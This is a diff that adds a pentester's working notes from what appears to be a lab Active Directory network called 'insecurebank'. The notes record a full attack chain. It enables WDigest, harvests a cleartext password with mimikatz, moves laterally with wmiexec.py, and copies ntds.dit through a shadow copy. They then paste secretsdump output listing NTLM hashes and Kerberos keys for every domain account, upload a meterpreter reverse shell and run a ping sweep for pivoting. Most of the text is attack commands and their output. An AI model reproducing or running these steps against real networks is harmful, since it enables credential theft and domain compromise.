@@ -742,4 +742,197 @@ Attempted to change the wdigest setting on
 https://www.trustedsec.com/2015/04/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/
 
 meterpreter > reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -d 1 
-Successfully set UseLogonCredential of REG_SZ.
+Successfully set UseLogonCredential of REG_SZ
+
+NOTE: now we should need to get bob to reconnect to be able to grab credentials
+
+Windows 2012 R2 x64 (build 9600) en_US 
+
+** Defense evasion - disable antivirus / antimalware
+
+kerberos mimikatz 
+https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos
+
+-> I could be using an old version of mimikatz
+
+** Bob's password
+	wdigest :	
+	 * Username : bob
+	 * Domain   : insecurebank
+	 * Password : Very_SafeDAPW!
+
+Path: 
++ logged in via meterpreter
++ Uploaded newer version of mimikatz (binary from github) 
+  * The one built into meterpreter was 1.0 and couldn't get digest passwords
++ executed new mimikatz binary
++ sekurlsa::logonPasswords
+so I executed mimikatz, then executed
+
+** Bob's machine - 21
+obtained openvpn config
+
+ping -a 10.59.4.17
+
+*** NOTE - deliver payload through wmi / https://www.trustedsec.com/2015/06/no_psexec_needed/
+
+*** NOTE - sysinternals tool suite - for example autoruns
+
+** Pivoting to the DC
+
+let's try to bob's machine
+../wmiexec.py bob:Very_SafeDAPW\!@10.59.4.21
+
+DC: ../wmiexec.py bob:Very_SafeDAPW\!@10.59.4.21
+/Note: we need to escape the !/
+
+Then we're in bob's
+
+*** Edward's ssh private key
+DEK-Info: AES-128-CBC,F27A1EC4F598875B32378B6E6DFF3795
+
+DC - created a volume shadow copy:
+C:\windows\ntds>vssadmin create shadow /for=c:
+
+Successfully created shadow copy for 'c:\'
+    Shadow Copy ID: {ba02786c-cb1f-4f44-8644-22975c7046bf}
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\ntds.dit
+then downloaded ntds.dit via wmiexec and removed the file
+the same repeated for SYSTEM hive
+
+Secrets dump from *ntds.dit*
+root@kali:~/Downloads/11-dc# impacket-secretsdump -system system -ntds ntds.dit LOCAL
+
+*** ntds dump
+*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:16df1e2f1ee258ed53b3a514abd4978a:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC1$:1004:aad3b435b51404eeaad3b435b51404ee:2ae949c82d64da279a76c069f4b86584:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ff3b0abe3052fd633f0eea8e0445a4b6:::
+alice:1107:aad3b435b51404eeaad3b435b51404ee:7ebf1439bd9142b22fa93ecc5633e601:::
+bob:1108:aad3b435b51404eeaad3b435b51404ee:d3ea06beca64d42948a2cb28f9583eb6:::
+charles:1109:aad3b435b51404eeaad3b435b51404ee:2661aedbddb32a6031668e453ca05818:::
+dave:1110:aad3b435b51404eeaad3b435b51404ee:4f06556cd97b91ad333ee4c42c6fb83d:::
+edward:1111:aad3b435b51404eeaad3b435b51404ee:bf5d30509a3e71c406f5d52e42c8742e:::
+fred:1112:aad3b435b51404eeaad3b435b51404ee:665ef2db6eed99be5363b5dce9f08437:::
+INTRANET$:1113:aad3b435b51404eeaad3b435b51404ee:d3acd13752128d7e469600ab4889d383:::
+DEV_SERVER$:1114:aad3b435b51404eeaad3b435b51404ee:b4378efa9bcf1379f3bb50f8aba19d12:::
+DAVE$:1115:aad3b435b51404eeaad3b435b51404ee:9527e1014913a052a5a58aaf117980cc:::
+BOB$:1116:aad3b435b51404eeaad3b435b51404ee:cc7765b13ad36c208cc879f91620353d:::
+EDWARD$:1117:aad3b435b51404eeaad3b435b51404ee:ce897cffe8472dc4dc24d94a201d4f78:::
+FRED$:1118:aad3b435b51404eeaad3b435b51404ee:0a591e1b55d466daaf98b4605408d8fe:::
+CHARLES$:1119:aad3b435b51404eeaad3b435b51404ee:7ec57532c27acc0afea99942e8080368:::
+ALICE$:1120:aad3b435b51404eeaad3b435b51404ee:77323c8c3b906ad620e1b6cd34217e76:::
+[*] Kerberos keys from ntds.dit 
+DC1$:aes256-cts-hmac-sha1-96:7128c66bdcabfdd0a42e6c9fc2d1f1ce920726e23edd23beecd4b69464a6a794
+DC1$:aes128-cts-hmac-sha1-96:5f92e18fa8e52fc90cc4aef0dc29636c
+DC1$:des-cbc-md5:d66e64204615b602
+DC1$:rc4_hmac:2ae949c82d64da279a76c069f4b86584
+krbtgt:aes256-cts-hmac-sha1-96:9a94d9cf1b3d0652be7d6796a819304b3fee347034c7a303b1461118f10719c3
+krbtgt:aes128-cts-hmac-sha1-96:cdb6d28156d3e69e7e8ced6b79cb1394
+krbtgt:des-cbc-md5:456da8921675a41a
+krbtgt:rc4_hmac:ff3b0abe3052fd633f0eea8e0445a4b6
+alice:aes256-cts-hmac-sha1-96:784e50ed785d355ca054e0b0da73fff468d044597aba0f95786be29f28e5b2f2
+alice:aes128-cts-hmac-sha1-96:bd33aa040b08471caa4f7d06bd0c9dfa
+alice:des-cbc-md5:7cc4f7f7d0c8ef4f
+alice:rc4_hmac:7ebf1439bd9142b22fa93ecc5633e601
+bob:aes256-cts-hmac-sha1-96:507715e8c611f613fa770689628b5daf88f6736ff55c92421b0bababae8ceb21
+bob:aes128-cts-hmac-sha1-96:77959e23f2a8a4fb932276cefcf9ddcd
+bob:des-cbc-md5:5dfe29b59876320e
+bob:rc4_hmac:d3ea06beca64d42948a2cb28f9583eb6
+charles:aes256-cts-hmac-sha1-96:ff7547b02e776529a122551d064da3bc1502451c7b228680c9282db26013c5d9
+charles:aes128-cts-hmac-sha1-96:023faa2fd6ca84ad847454dbfcd7d34c
+charles:des-cbc-md5:ae02020775a2f14c
+charles:rc4_hmac:2661aedbddb32a6031668e453ca05818
+dave:aes256-cts-hmac-sha1-96:60b4626e2dadcac21e79df2c2e9cf34e1260d84276f95e28412a51336fcca25f
+dave:aes128-cts-hmac-sha1-96:7c7e69090305c950e7f8c64eec589d12
+dave:des-cbc-md5:5dc857312f75706b
+dave:rc4_hmac:4f06556cd97b91ad333ee4c42c6fb83d
+edward:aes256-cts-hmac-sha1-96:a6d7fbfb7bd14b65cd51dea23e35c0190f95a1eef8dd4c13e05e6fe4ddc00ba1
+edward:aes128-cts-hmac-sha1-96:54bd4e459d5491defaadb0f9ad2f151c
+edward:des-cbc-md5:205d4fcdb0323db6
+edward:rc4_hmac:bf5d30509a3e71c406f5d52e42c8742e
+fred:aes256-cts-hmac-sha1-96:9bac02b59b9edad03b757e0573e5086bc26d13a3c7d109409b18328fe4d1a4fb
+fred:aes128-cts-hmac-sha1-96:92bce228d5fb8b292dd44d9a3b06335e
+fred:des-cbc-md5:2cb329989ba194da
+fred:rc4_hmac:665ef2db6eed99be5363b5dce9f08437
+INTRANET$:aes256-cts-hmac-sha1-96:862d06a74857f774898577fb8714c5ca47eef76efce15be0d736d40e2de8e51a
+INTRANET$:aes128-cts-hmac-sha1-96:e73b94eb022e2bed6410a07e194c8589
+INTRANET$:des-cbc-md5:fbdf467cc2fb204f
+INTRANET$:rc4_hmac:d3acd13752128d7e469600ab4889d383
+DEV_SERVER$:aes256-cts-hmac-sha1-96:ab1cd5094f32e8d9970cb6ab30675a9c5e945f9565e01a2e8c2c015cd0eda098
+DEV_SERVER$:aes128-cts-hmac-sha1-96:387a65c76fa0d808e9b46636ec7c347b
+DEV_SERVER$:des-cbc-md5:044f9ddf6213d694
+DEV_SERVER$:rc4_hmac:b4378efa9bcf1379f3bb50f8aba19d12
+DAVE$:aes256-cts-hmac-sha1-96:58e99ed6c08f071c31b98d0a3cdad362f9f700b94adf6491b6c998ece83457ac
+DAVE$:aes128-cts-hmac-sha1-96:e78c33a63c2aa722368394a3c8e3e125
+DAVE$:des-cbc-md5:2a9dd54989fdceb5
+DAVE$:rc4_hmac:9527e1014913a052a5a58aaf117980cc
+BOB$:aes256-cts-hmac-sha1-96:e5feb0bb1626a69461bdfc27b7fa20f3f47aca5cdadd2abb2fba0617e17eabb7
+BOB$:aes128-cts-hmac-sha1-96:87a92097fa2c30e54bc0eb6b9a3bae6f
+BOB$:des-cbc-md5:ceb38658704673e9
+BOB$:rc4_hmac:cc7765b13ad36c208cc879f91620353d
+EDWARD$:aes256-cts-hmac-sha1-96:04f0e74de79397d72e78519347f59a567347c5a8d2d645bb3461cb7b2758e926
+EDWARD$:aes128-cts-hmac-sha1-96:fd581047657c7fe1e2073a710e91d14f
+EDWARD$:des-cbc-md5:04f1c807c1abec31
+EDWARD$:rc4_hmac:ce897cffe8472dc4dc24d94a201d4f78
+FRED$:aes256-cts-hmac-sha1-96:03a7c7b5212657362973b899f9ad8e4b0ba64e34126761d3b25692aafbabb66d
+FRED$:aes128-cts-hmac-sha1-96:3d7e52edfda209623c39c7f822ee7707
+FRED$:des-cbc-md5:a257310885371358
+FRED$:rc4_hmac:0a591e1b55d466daaf98b4605408d8fe
+CHARLES$:aes256-cts-hmac-sha1-96:142c00422911817ac8a901d307d1a605b3af7f6d09df94ac7c9160387001c3ac
+CHARLES$:aes128-cts-hmac-sha1-96:09eae7edf31424013396112cd044d84d
+CHARLES$:des-cbc-md5:58f4f2c70191ae29
+CHARLES$:rc4_hmac:7ec57532c27acc0afea99942e8080368
+ALICE$:aes256-cts-hmac-sha1-96:95c62f827b475e1dbdae3ccb865045e34b389a5b1f489c8f10a6f20d42e07fed
+ALICE$:aes128-cts-hmac-sha1-96:83cf03a0ee49aacd692f38b3e3835cdc
+ALICE$:des-cbc-md5:0eb3b51a7062518c
+ALICE$:rc4_hmac:77323c8c3b906ad620e1b6cd34217e76
+
+
+*** going to the machine with 3 NICs
+
+10.59.4.17
+~./wmiexec.py bob:Very_SafeDAPW\!@10.59.4.17~
+
+Uploaded meterpreter as c:\see.exe (reverse shell x64 -> 443)
+
+Note - I needed to migrate to x64 
+
+I'm not sure how to execute nmap over this machine, 
+
+windows ping sweep:
+for /l %i in (1,1,254) do @ping -n 1 -w 100 10.59.3.%i >> ping.txt
+
+did also ~arp -a~
+
+*** arp results on 10.59.4.17
+
+Interface: 10.59.5.13 --- 0xf
+  Internet Address      Physical Address      Type
+  10.59.5.1             00-24-81-4a-e1-ec     dynamic   
+  10.59.5.10            00-24-81-76-5a-06     dynamic      
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.252           01-00-5e-00-00-fc     static       
+
+Interface: 10.59.3.10 --- 0x10
+  Internet Address      Physical Address      Type
+  10.59.3.1             00-24-81-6f-a3-f6     dynamic   
+  10.59.3.11            00-24-81-38-95-08     dynamic   
+  10.59.3.12            00-24-81-0f-92-49     dynamic   
+  10.59.3.13            00-24-81-7f-c2-03     dynamic   
+  10.59.3.14            00-24-81-59-46-ac     dynamic    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.252           01-00-5e-00-00-fc     static    
+
+10.59.3.10 -> ADMIN (.4.17)
+10.59.5.13 -> ADMIN (.4.17)
+
+How do we tunnel the traffic over meterpreter session?
+https://www.blackhillsinfosec.com/use-nmap-meterpreter/
+
+
+
+
